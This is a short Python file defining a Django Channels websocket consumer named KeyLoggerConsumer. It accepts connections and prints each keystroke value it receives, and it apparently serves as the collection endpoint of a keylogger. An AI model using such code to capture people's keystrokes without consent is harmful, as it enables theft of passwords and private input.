import json
from channels.generic.websocket import WebsocketConsumer

class KeyLoggerConsumer(WebsocketConsumer):
    def connect(self):
        self.accept()

    def receive(self, text_data):
        data = json.loads(text_data)
        print(f"[KEY] {data['key']}")
